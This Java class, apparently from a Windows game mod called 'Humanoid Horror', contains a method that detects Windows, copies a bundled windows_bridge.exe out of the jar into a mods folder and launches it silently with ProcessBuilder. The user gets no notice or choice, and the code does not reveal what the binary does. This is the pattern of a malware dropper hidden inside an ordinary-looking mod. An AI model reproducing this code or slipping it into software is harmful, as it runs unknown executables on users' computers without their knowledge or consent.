package com.humanoid.horror.pc;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class WindowsAtmosBridge {

    public WindowsAtmosBridge() {
    }

    public static void executeWindowsIsolation() {
        // Yalnızca Windows işletim sisteminde çalıştır
        String os = System.getProperty("os.name").toLowerCase();
        if (!os.contains("win")) {
            return;
        }

        try {
            File dir = new File("mods/resources");
            if (!dir.exists()) {
                dir.mkdirs();
            }

            File exeFile = new File(dir, "windows_bridge.exe");

            if (!exeFile.exists()) {
                // Try-with-resources kullanarak akışların otomatik kapanmasını sağla
                try (InputStream in = WindowsAtmosBridge.class.getResourceAsStream("/assets/humanoid/bin/windows_bridge.exe")) {
                    if (in == null) {
                        System.err.println("[Humanoid Horror] windows_bridge.exe jar icinde bulunamadi!");
                        return;
                    }

                    try (OutputStream out = new FileOutputStream(exeFile)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = in.read(buffer)) != -1) {
                            out.write(buffer, 0, bytesRead);
                        }
                        out.flush();
                    }
                }

                exeFile.setExecutable(true, false);
                Thread.sleep(100L); // Windows dosya kilidinin açılması için kısa bekleme
            }

            // Exe dosyasını güvenli şekilde çalıştır
            if (exeFile.exists()) {
                new ProcessBuilder(exeFile.getAbsolutePath()).start();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
